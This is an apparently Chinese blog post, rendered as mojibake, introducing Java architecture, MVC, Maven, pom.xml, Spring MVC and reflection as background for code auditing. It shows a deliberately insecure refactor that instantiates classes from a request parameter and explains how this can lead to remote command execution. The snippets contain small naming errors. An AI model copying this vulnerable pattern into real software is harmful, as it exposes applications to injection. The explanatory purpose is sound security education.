        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="ä¸€ã€Java-ä¸‰å±‚æ¶æ„"><a href="#ä¸€ã€Java-ä¸‰å±‚æ¶æ„" class="headerlink" title="ä¸€ã€Java ä¸‰å±‚æ¶æ„"></a>ä¸€ã€Java ä¸‰å±‚æ¶æ„</h3><p>Java é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­æŠŠæ•´ä¸ªé¡¹ç›®åˆ†ä¸ºä¸‰å±‚ï¼šè¡¨ç°å±‚ã€æ•°æ®è®¿é—®å±‚ã€ä¸šåŠ¡é€»è¾‘å±‚ã€‚</p><ul><li>è¡¨ç°å±‚ï¼šMVCï¼ˆModel-ViewControlerï¼‰æ¨¡å¼ï¼Œé‡‡ç”¨ <code>JSP/Servlet</code> æŠ€æœ¯è¿›è¡Œé¡µé¢æ•ˆæœæ˜¾ç¤ºï¼Œå³ç”¨æˆ·æ“ä½œç•Œé¢ï¼Œä¸ºç”¨æˆ·æä¾›äº¤äº’æ“ä½œã€‚</li><li>æ•°æ®è®¿é—®å±‚ï¼š é‡‡ç”¨ <code>DAO</code> æ¨¡å¼, <code>DAO</code> ä¸ºæä¾›è®¿é—®å…³ç³»å‹æ•°æ®åº“ç³»ç»Ÿæ‰€éœ€æ“ä½œçš„æ¥å£ï¼Œå°†æ•°æ®è®¿é—®å’Œä¸šåŠ¡é€»è¾‘åˆ†ç¦»å¯¹ä¸Šå±‚æä¾›é¢å‘å¯¹è±¡çš„æ•°æ®è®¿é—®æ¥å£,ä¹Ÿå°±æ˜¯å“ªä¸ªç±»å¯¹åº”å“ªä¸ªè¡¨ï¼Œå“ªä¸ªå±æ€§å¯¹åº”å“ªä¸ªåˆ—ï¼Œä¸ºä¸šåŠ¡é€»è¾‘å±‚æä¾›æ•°æ®ï¼Œæ ¹æ®ä¼ å…¥çš„å€¼æ¥æ“ä½œæ•°æ®åº“ï¼Œå¢ã€åˆ ã€æ”¹ã€æŸ¥ã€‚</li><li>ä¸šåŠ¡é€»è¾‘å±‚ï¼šé‡‡ç”¨äº‹åŠ¡è„šæœ¬æ¨¡å¼ï¼Œè´Ÿè´£å…³é”®ä¸šåŠ¡çš„å¤„ç†å’Œæ•°æ®ä¼ é€’ï¼Œå¤æ‚çš„é€»è¾‘åˆ¤æ–­å’Œæ¶‰åŠåˆ°æ•°æ®åº“çš„æ•°æ®éªŒè¯å‡éœ€è¦åœ¨æ­¤è¿›è¡Œå¤„ç†ï¼Œæ ¹æ®ç”¨æˆ·ä¼ å…¥çš„å€¼è¿”å›ç›¸å…³æ•°æ®æˆ–å¤„ç†ç›¸å…³é€»è¾‘ã€‚</li></ul><p>SSH æ¡†æ¶</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸šåŠ¡å±‚â€”â€”Spring</span><br><span class="line">è¡¨ç°å±‚â€”â€”Struts</span><br><span class="line">æŒä¹…å±‚â€”â€”Hibernate</span><br></pre></td></tr></table></figure></div><p>SSMæ¡†æ¶</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸šåŠ¡å±‚â€”â€”Spring</span><br><span class="line">è¡¨ç°å±‚â€”â€”SpringMVC</span><br><span class="line">æŒä¹…å±‚â€”â€”MyBatis</span><br></pre></td></tr></table></figure></div><br/><h3 id="äºŒã€MVCæ¨¡å¼"><a href="#äºŒã€MVCæ¨¡å¼" class="headerlink" title="äºŒã€MVCæ¨¡å¼"></a>äºŒã€MVCæ¨¡å¼</h3><p>MVCï¼Œå…¨ç§°æ˜¯ <code>Model-View-Controllerï¼ˆæ¨¡å‹-è§†å›¾-æ§åˆ¶å™¨ï¼‰</code>ï¼Œæ˜¯ä¸€ç§è®¾è®¡çš„è§„èŒƒï¼Œä¸€ç§æ¶æ„çš„æ¨¡å¼ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Model æ¨¡å‹ï¼šæä¾›æ•°æ®å’Œè¡Œä¸ºï¼Œå³ Dao å’Œ Service</span><br><span class="line">View è§†å›¾ï¼š GUIç»„ä»¶ï¼Œç”¨äºæ•°æ®çš„å±•ç¤ºï¼ŒåŠjspã€htmlç­‰</span><br><span class="line">Controller æ§åˆ¶å™¨ï¼šç”¨äºæµç¨‹çš„æ§åˆ¶ï¼Œæ¥æ”¶ç”¨æˆ·è¯·æ±‚ï¼Œäº¤ç»™ä¸šåŠ¡å±‚å¤„ç†ï¼Œå†æŠŠå¤„ç†åçš„æ¨¡å‹æ•°æ®å“åº”ç»™è§†å›¾ï¼Œå³servletã€controller</span><br></pre></td></tr></table></figure></div><p>å·¥ä½œæµç¨‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Controllerå±‚æ¥æ”¶åˆ°ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶å†³å®šåº”è¯¥ç”¨å“ªä¸ªModelæ¥è¿›è¡Œå¤„ç†ï¼Œç„¶åç”± Model ä½¿ç”¨é€»è¾‘å¤„ç†ç”¨æˆ·çš„è¯·æ±‚å¹¶è¿”å›æ•°æ®ï¼›æœ€åï¼Œè¿”å›çš„æ•°æ®é€šè¿‡Viewå±‚å‘ˆç°ç»™ç”¨æˆ·ã€‚</span><br></pre></td></tr></table></figure></div><br/><h3 id="ä¸‰ã€Maven"><a href="#ä¸‰ã€Maven" class="headerlink" title="ä¸‰ã€Maven"></a>ä¸‰ã€Maven</h3><p><code>Maven</code> æ˜¯ä¸€ä¸ªé¡¹ç›®ç®¡ç†å·¥å…·ï¼Œå®ƒåŒ…å«äº†ä¸€ä¸ªå¯¹è±¡æ¨¡å‹ï¼ˆProject Object Modelï¼‰ï¼Œæ˜¯ä¸€ç»„æ ‡å‡†é›†åˆï¼Œä¸€ä¸ªä¾èµ–ç®¡ç†ç³»ç»Ÿï¼Œç”¨æ¥è¿è¡Œå®šä¹‰åœ¨ç”Ÿå‘½å‘¨æœŸé˜¶æ®µä¸­æ’ä»¶ç›®æ ‡å’Œé€»è¾‘ã€‚æ ¸å¿ƒåŠŸèƒ½ä¸ºï¼šé€šè¿‡ <code>pom.xml</code>æ–‡ä»¶çš„é…ç½®è·å– jar åŒ…ä¸ç”¨æ‰‹åŠ¨å»æ·»åŠ  jar åŒ…ã€‚æ—¥å¸¸é¡¹ç›®å¼€å‘éœ€è¦åº”ç”¨å„ç§jaråŒ…ï¼Œå°‘åˆ™å‡ åã€å¤šè‡³ä¸Šç™¾ï¼Œè‹¥æ¯ä¸€ä¸ªjaréƒ½ä½¿ç”¨äººå·¥å¯¼å…¥åˆ™å¤§å¤§å¢åŠ å·¥ä½œé‡ã€‚<code>Maven</code>ä½¿è¿™ä¸€éƒ¨åˆ†å·¥ä½œå˜å¾—ç®€å•ï¼Œå¼€å‘è€…åªéœ€é€šè¿‡å®šä¹‰ <code>pom.xml</code>ï¼Œ<code>maven</code> å³å¯è°ƒç”¨ä»“åº“çš„  jar åŒ…ç›´æ¥å¯¼å…¥ã€‚</p><br/><h3 id="å››ã€pom-xml"><a href="#å››ã€pom-xml" class="headerlink" title="å››ã€pom.xml"></a>å››ã€pom.xml</h3><p>POM æ˜¯é¡¹ç›®å¯¹è±¡æ¨¡å‹ (Project Object Model) çš„ç®€ç§°,å®ƒæ˜¯ Maven é¡¹ç›®ä¸­çš„æ–‡ä»¶ï¼Œä½¿ç”¨XMLè¡¨ç¤ºï¼Œåç§°å«åšpom.xmlã€‚è¯¥æ–‡ä»¶ç”¨äºç®¡ç†æºä»£ç ã€é…ç½®æ–‡ä»¶ã€å¼€å‘è€…çš„ä¿¡æ¯å’Œè§’è‰²ã€é—®é¢˜è¿½è¸ªç³»ç»Ÿã€ç»„ç»‡ä¿¡æ¯ã€é¡¹ç›®æˆæƒã€é¡¹ç›®çš„urlã€é¡¹ç›®çš„ä¾èµ–å…³ç³»ç­‰ã€‚Maven é¡¹ç›®ä¸­å¿…é¡»åŒ…å« pom.xml æ–‡ä»¶ã€‚ä¾‹å­å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--project æ ‡ç­¾ï¼šæ ¹æ ‡ç­¾ï¼Œè¡¨ç¤ºå¯¹å½“å‰å·¥ç¨‹è¿›è¡Œé…ç½®ã€ç®¡ç†--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--modelVersion æ ‡ç­¾ï¼šä»Maven2å¼€å§‹å°±å›ºå®šæ˜¯4.0.0--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--ä»£è¡¨å½“å‰pom.xmlæ‰€é‡‡ç”¨çš„æ ‡ç­¾ç»“æ„--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!--åæ ‡ä¿¡æ¯--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--åœ¨æœ¬åœ°ä»“åº“ä¸­å®‰è£…åå¯¹åº”çš„è·¯å¾„ï¼šcom\seer\maven\seer-heathy-demo\1.0-SNAPSHOT\seer-heathy-demo-1.0-SNAPSHOT.jar--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--groupId æ ‡ç­¾ï¼šåæ ‡å‘é‡ä¹‹ä¸€ï¼›ä»£è¡¨å…¬å¸æˆ–ç»„ç»‡å¼€å‘çš„æŸä¸€ä¸ªé¡¹ç›®--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.seer.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--artifactId æ ‡ç­¾ï¼šåæ ‡å‘é‡ä¹‹ä¸€ï¼›ä»£è¡¨é¡¹ç›®ä¸‹çš„æŸä¸€ä¸ªæ¨¡å—--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seer-heathy-demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--version æ ‡ç­¾ï¼šåæ ‡å‘é‡ä¹‹ä¸€ï¼›ä»£è¡¨å½“å‰æ¨¡å—çš„ç‰ˆæœ¬--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!--packaging æ ‡ç­¾ï¼šæ‰“åŒ…æ–¹å¼--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--å–å€¼jarï¼šç”ŸæˆjaråŒ…ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªJavaå·¥ç¨‹--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--å–å€¼war:ç”ŸæˆwaråŒ…ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªWebå·¥ç¨‹--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--å–å€¼pomï¼šè¯´æ˜è¿™ä¸ªå·¥ç¨‹æ˜¯ç”¨æ¥ç®¡ç†å…¶ä»–å·¥ç¨‹çš„å·¥ç¨‹--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>seer-heathy-demo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!--åœ¨Mavenä¸­å®šä¹‰å±æ€§å€¼--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--åœ¨æ„å»ºè¿‡ç¨‹ä¸­è¯»å–æºç æ—¶ä½¿ç”¨çš„å­—ç¬¦é›†--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!--dependenciesæ ‡ç­¾ï¼šé…ç½®å…·ä½“ä¾èµ–ä¿¡æ¯ï¼Œå¯ä»¥åŒ…å«å¤šä¸ªdependencyå­æ ‡ç­¾--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--dependency æ ‡ç­¾ï¼šé…ç½®ä¸€ä¸ªå…·ä½“çš„ä¾èµ–ä¿¡æ¯--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--åæ ‡ä¿¡æ¯ï¼šå¯¼å…¥é‚£ä¸ªjaråŒ…ï¼Œå°±é…ç½®å®ƒçš„åæ ‡ä¿¡æ¯å³å¯--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--scopeæ ‡ç­¾ï¼šé…ç½®å½“å‰ä¾èµ–çš„èŒƒå›´--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></div><br/><h3 id="äº”ã€Spring-Boot"><a href="#äº”ã€Spring-Boot" class="headerlink" title="äº”ã€Spring Boot"></a>äº”ã€Spring Boot</h3><p><code>SpringBoot</code> æ˜¯ä¸€æ¬¾åŸºäº <code>JAVA</code> çš„å¼€æºæ¡†æ¶ã€‚ç›®çš„æ˜¯ä¸ºäº†ç®€åŒ– <code>Spring</code> åº”ç”¨æ­å»ºå’Œå¼€å‘æµç¨‹ã€‚ç°åœ¨ç»å¤§å¤šæ•°çš„æ–°é¡¹ç›®éƒ½åŸºäº <code>Spring Boot</code> çš„ <code>Spring MVC</code> æ¥å®ç°ã€‚</p><h4 id="1ã€Spring-MVC"><a href="#1ã€Spring-MVC" class="headerlink" title="1ã€Spring MVC"></a>1ã€Spring MVC</h4><p><code>Spring MVC</code> æ˜¯ <code>Spring</code> æä¾›çš„ä¸€ä¸ªåŸºäº <code>MVC</code> è®¾è®¡æ¨¡å¼çš„è½»é‡çº§ <code>Web</code> å¼€å‘æ¡†æ¶ï¼Œæœ¬è´¨ä¸Šç›¸å½“äº <code>Servlet</code>ï¼ˆServlet æ˜¯è¿è¡Œåœ¨ <code>Web</code> æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª <code>Web</code> æµè§ˆå™¨æˆ–å…¶ä»– <code>HTTP</code> å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ <code>HTTP</code> æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚ï¼‰</p><h4 id="2ã€æ¥å£"><a href="#2ã€æ¥å£" class="headerlink" title="2ã€æ¥å£"></a>2ã€æ¥å£</h4><ul><li><code>DispatcherServlet æ¥å£</code>ï¼šå‰ç«¯æ§åˆ¶å™¨ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½ç»è¿‡å®ƒæ¥ç»Ÿä¸€åˆ†å‘ï¼ŒDispatcherServletå°†è¯·æ±‚åˆ†å‘ç»™Spring Controllerä¹‹å‰ï¼Œéœ€è¦å€ŸåŠ©äºSpringæä¾›çš„HandlerMappingå®šä½åˆ°å…·ä½“çš„ Controllerã€‚</li><li><code>HandlerMapping æ¥å£</code>ï¼šå®Œæˆå®¢æˆ·è¯·æ±‚åˆ° Controller çš„æ˜ å°„ã€‚</li><li><code>Controlleræ¥å£</code>ï¼šå¹¶å‘ç”¨æˆ·å¤„ç† DispatcherServletã€HandlerMapping è¯·æ±‚ï¼Œå› æ­¤å®ç°Controlleræ¥å£æ—¶ï¼Œå¿…é¡»ä¿è¯çº¿ç¨‹å®‰å…¨å¹¶ä¸”å¯é‡ç”¨ã€‚</li></ul><h4 id="3ã€DispatcherServlet"><a href="#3ã€DispatcherServlet" class="headerlink" title="3ã€DispatcherServlet"></a>3ã€DispatcherServlet</h4><p>æ˜¯æ•´ä¸ªSpring MVCçš„æ ¸å¿ƒã€‚ä¸»è¦è´Ÿè´£æˆªè·è¯·æ±‚å¹¶å°†å…¶åˆ†æ´¾ç»™ç›¸åº”çš„å¤„ç†å™¨å¤„ç†ã€‚å…¶ä¸»è¦å·¥ä½œæœ‰ä»¥ä¸‹ä¸‰é¡¹ï¼š</p><ul><li>æˆªè·ç¬¦åˆç‰¹å®šæ ¼å¼çš„URLè¯·æ±‚</li><li>åˆå§‹åŒ– DispatcherServlet ä¸Šä¸‹æ–‡å¯¹åº” WebApplicationContext ï¼Œå¹¶å°†å…¶ä¸ä¸šåŠ¡å±‚ã€æŒä¹…åŒ–å±‚çš„ WebApplicationContext å»ºç«‹å…³è”ã€‚</li><li>åˆå§‹åŒ– Spring MVC çš„å„ä¸ªç»„æˆç»„ä»¶ï¼Œå¹¶è£…é…åˆ° DispatcherServlet ä¸­ã€‚</li></ul><br/><h3 id="å…­ã€Java-åå°„æœºåˆ¶"><a href="#å…­ã€Java-åå°„æœºåˆ¶" class="headerlink" title="å…­ã€Java åå°„æœºåˆ¶"></a>å…­ã€Java åå°„æœºåˆ¶</h3><p>Java åå°„æœºåˆ¶å¯ä»¥æ— è§†ç±»æ–¹æ³•ã€å˜é‡å»è®¿é—®æƒé™ä¿®é¥°ç¬¦ï¼ˆå¦‚ protectedã€privateç­‰ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥è°ƒç”¨ä»»ä½•ç±»çš„ä»»æ„æ–¹æ³•ã€è®¿é—®å¹¶ä¿®æ”¹æˆå‘˜å˜é‡å€¼ã€‚å³å½“æˆ‘ä»¬åœ¨èƒ½æ§åˆ¶åå°„çš„ç±»åã€æ–¹æ³•åã€å‚æ•°çš„å‰æä¸‹ï¼Œå‘ç°äº†ä¸€å¤„ Java åå°„è°ƒç”¨çš„æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»»æ„æ„é€ æ”»å‡»ã€‚</p><p>1ã€ä»€ä¹ˆæ˜¯åå°„<br>åå°„ä½¿ Java ä»£ç èƒ½å¤Ÿå‘ç°æœ‰å…³å·²åŠ è½½ç±»çš„å­—æ®µã€æ–¹æ³•å’Œæ„é€ å‡½æ•°çš„ä¿¡æ¯ï¼Œå¹¶åœ¨å®‰å…¨é™åˆ¶å†…ä½¿ç”¨åå°„çš„å­—æ®µã€æ–¹æ³•å’Œæ„é€ å‡½æ•°å¯¹åº•å±‚å¯¹åº”çš„å¯¹è±¡è¿›è¡Œæ“ä½œã€‚å³é€šè¿‡åå°„æˆ‘ä»¬å¯ä»¥åœ¨è¿è¡Œæ—¶è·å¾—ç¨‹åºæˆ–ç¨‹åºé›†ä¸­æ¯ä¸€ä¸ªç±»å‹çš„æˆå‘˜å’Œæˆå‘˜ä¿¡æ¯ã€‚åœ¨è¿è¡ŒçŠ¶æ€ä¸­é€šè¿‡åå°„æœºåˆ¶ï¼Œæˆ‘ä»¬èƒ½åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±»ï¼Œäº†è§£ä»»æ„ä¸€ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œèƒ½å¤Ÿè°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„ä»»æ„æ–¹æ³•å’Œå±æ€§ã€‚</p><p>2ã€ä¸å®‰å…¨çš„åå°„æœºåˆ¶<br>Java çš„åå°„æœºåˆ¶å¯ä»¥æ— è§†ç±»æ–¹æ³•ã€å˜é‡è®¿é—®æƒé™ä¿®é¥°ç¬¦ï¼Œå¯ä»¥è°ƒç”¨ä»»ä½•ç±»çš„ä»»æ„æ–¹æ³•ã€è®¿é—®å¹¶ä¿®æ”¹æˆå‘˜å˜é‡å€¼ï¼Œé‚£ä¹ˆè¿™å¯èƒ½å¯¼è‡´å®‰å…¨é—®é¢˜ï¼Œå¦‚æœä¸€ä¸ªæ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡åº”ç”¨ç¨‹åºåˆ›å»ºæ„å¤–çš„æ§åˆ¶æµè·¯å¾„ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ç»•è¿‡å®‰å…¨æ£€æŸ¥å‘èµ·ç›¸å…³æ”»å‡»ã€‚å‡è®¾æœ‰æ®µä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">Command</span> <span class="variable">command</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"> <span class="keyword">if</span> (name.equals(<span class="string">&quot;Delect&quot;</span>)) &#123;</span><br><span class="line">   command = <span class="keyword">new</span> <span class="title class_">DelectCommand</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctl.equals(<span class="string">&quot;Add&quot;</span>)) &#123;</span><br><span class="line">   command = <span class="keyword">new</span> <span class="title class_">AddCommand</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br><span class="line">command.doAction(request);</span><br></pre></td></tr></table></figure></div><p>å­˜åœ¨ä¸€ä¸ªå­—æ®µä¸º nameï¼Œå½“è·å–ç”¨æˆ·è¯·æ±‚çš„ name å­—æ®µåè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœè¯·æ±‚çš„æ˜¯ Delect æ“ä½œï¼Œåˆ™æ‰§è¡ŒDelectCommand å‡½æ•°ï¼Œè‹¥æ‰§è¡Œçš„æ˜¯ Add æ“ä½œï¼Œåˆ™æ‰§è¡Œ AddCommand å‡½æ•°ï¼Œå¦‚æœä¸æ˜¯è¿™ä¸¤ç§æ“ä½œï¼Œåˆ™æ‰§è¡Œå…¶ä»–ä»£ç ã€‚<br>æ­¤æ—¶ï¼Œå‡å¦‚æœ‰ä½å¼€å‘è€…çœ‹åˆ°äº†è¿™æ®µä»£ç ï¼Œä»–è§‰å¾—å¯ä»¥ä½¿ç”¨Java çš„åå°„æ¥é‡æ„æ­¤ä»£ç ä»¥å‡å°‘ä»£ç è¡Œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">  <span class="type">Class</span> <span class="variable">ComandClass</span> <span class="operator">=</span> Class.forName(name + <span class="string">&quot;Command&quot;</span>);</span><br><span class="line">  <span class="type">Command</span> <span class="variable">command</span> <span class="operator">=</span> (Command) CommandClass.newInstance();</span><br><span class="line">  command.doAction(request);</span><br></pre></td></tr></table></figure></div><p>è¿™æ ·çš„é‡æ„çœ‹èµ·æ¥ä½¿å¾—ä»£ç è¡Œå‡å°‘ï¼Œæ¶ˆé™¤äº† if&#x2F;else å—ï¼Œè€Œä¸”å¯ä»¥åœ¨ä¸ä¿®æ”¹å‘½ä»¤åˆ†æ´¾å™¨çš„æƒ…å†µä¸‹æ·»åŠ æ–°çš„å‘½ä»¤ç±»å‹ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰å¯¹ä¼ å…¥è¿›æ¥çš„ name å­—æ®µè¿›è¡Œé™åˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å®ä¾‹åŒ–å®ç° Command æ¥å£çš„ä»»ä½•å¯¹è±¡ï¼Œä»è€Œå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚å®é™…ä¸Šï¼Œæ”»å‡»è€…ç”šè‡³ä¸å±€é™äºæœ¬ä¾‹ä¸­çš„ Command æ¥å£å¯¹è±¡ï¼Œè€Œæ˜¯ä½¿ç”¨ä»»ä½•å…¶ä»–å¯¹è±¡æ¥å®ç°ï¼Œå¦‚è°ƒç”¨ç³»ç»Ÿä¸­ä»»ä½•å¯¹è±¡çš„é»˜è®¤æ„é€ å‡½æ•°ï¼Œå†å¦‚è°ƒç”¨ Runtime å¯¹è±¡å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿™å°±å¯èƒ½å¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå› æ­¤ä¸å®‰å…¨çš„åå°„çš„å±å®³æ€§æå¤§ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å®¡è®¡è¿‡ç¨‹ä¸­é‡ç‚¹å…³æ³¨çš„å†…å®¹ã€‚</p><br/><h3 id="ä¸ƒã€Java-EE-æ ¸å¿ƒæŠ€æœ¯"><a href="#ä¸ƒã€Java-EE-æ ¸å¿ƒæŠ€æœ¯" class="headerlink" title="ä¸ƒã€Java EE æ ¸å¿ƒæŠ€æœ¯"></a>ä¸ƒã€Java EE æ ¸å¿ƒæŠ€æœ¯</h3><ul><li>JDBCï¼šJava æ•°æ®åº“é“¾æ¥ï¼Œæä¾›äº†å®¢æˆ·ç«¯è®¿é—®æ•°æ®åº“åº”ç”¨çš„ç¨‹åºæ¥å£ä»¥åŠæŸ¥è¯¢å’Œæ›´æ–°æ•°æ®åº“ä¸­æ•°æ®çš„æ–¹æ³•ã€‚</li><li>JNDIï¼šJava å‘½åå’Œç›®å½•æ¥å£ï¼Œæ˜¯ JAVA 